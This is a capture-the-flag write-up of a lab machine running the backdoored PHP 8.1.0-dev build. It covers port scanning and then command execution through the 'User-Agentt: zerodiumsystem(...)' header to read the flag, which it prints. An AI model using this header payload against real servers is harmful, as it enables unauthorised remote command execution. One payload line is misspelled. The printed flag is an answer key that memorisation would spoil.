Attack machine IP: 192.168.136.34
Target machine IP: 10.81.143.228

└─$ nmap -sS 10.81.143.228 -p- -vv -n -T4          
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-27 09:45 -0500
Initiating Ping Scan at 09:45
Scanning 10.81.143.228 [4 ports]
Completed Ping Scan at 09:45, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 09:45
Scanning 10.81.143.228 [65535 ports]
Discovered open port 80/tcp on 10.81.143.228
Completed SYN Stealth Scan at 09:45, 20.74s elapsed (65535 total ports)
Nmap scan report for 10.81.143.228
Host is up, received reset ttl 62 (0.038s latency).
Scanned at 2026-01-27 09:45:30 EST for 20s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 61

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds
           Raw packets sent: 65551 (2.884MB) | Rcvd: 65536 (2.621MB)




PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 61 PHP cli server 5.5 or later (PHP 8.1.0-dev)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title:  Admin Dashboard


At port 80 we have admin panel to which we're already logged in..
Most of the subpages however are not available (404: Not Found)

└─$ gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url 10.81.143.228 -x php,html,txt --exclude-length 42131

It didn't return anything new. 

The main page is index.php. Other two available sites are 404.html and blank.html. There is no value in .html pages. I looked for anything interesting, but found nothing.

Let's check the headers on .php site using curl:
```
└─$ curl -I http://10.81.143.228/index.php#            
HTTP/1.1 200 OK
Host: 10.81.143.228
Date: Tue, 27 Jan 2026 15:09:16 GMT
Connection: close
X-Powered-By: PHP/8.1.0-dev
Content-type: text/html; charset=UTF-8
```
>You can also do it through applications like `Burp Suite`. For this one we didn't have a lot of sites to check, so it was faster to use just `curl`.

We can see it's a PHP/8.1.0-dev page. 

If you look it up on the internet, there's actually a Remote Code Execution vulnerability called "User-Agentt Header RCE". `Agent T`.. seems familiar?

There's a 'Medium.com' page dedicated to explaining the vulnerability. I encourage you to read it, it's fun!

So PHP/8.1.0-dev has a backdoor. And we can exploit it by setting up a header in GET request to `User-Agentt: zerodiumssytem("{command}");`
>Notice the double 't' in 'User-Agentt'

Here I used Burp Suite to modify the requests.

`whoami` command tells us we're already root.

I wanted to create a reverse shell with `nc -lvnp 4217`, but that didn't work. 

So I thought of path traversal. What I mean is using `ls ../` to check if we can access one folder above the current one (where commands execute). 

As a matter of fact, we can! After a short while of testing I found out that executing `ls ../../../` brings us to the main `'/'` directory. And surprise, surprise, that's where the flag is!

Instead of 'ls' command, now use 'cat ../../../flag.txt`.
>Full User-Agentt is: 'User-Agentt: zerodiumsystem("cat ../../../flag.txt");'

Flag: `flag{4127d0530abf16d6d23973e3df8dbecb}`

### Conclusion
Thanks for coming by! It was a fun and quick room that further expands our knowledge. For me it's so cool to learn that such a vulnerability has been introduced to php some time ago!

### Sources
[https://curl.se/](https://curl.se/)<br>
[https://amsghimire.medium.com/php-8-1-0-dev-backdoor-cb224e7f5914](https://amsghimire.medium.com/php-8-1-0-dev-backdoor-cb224e7f5914)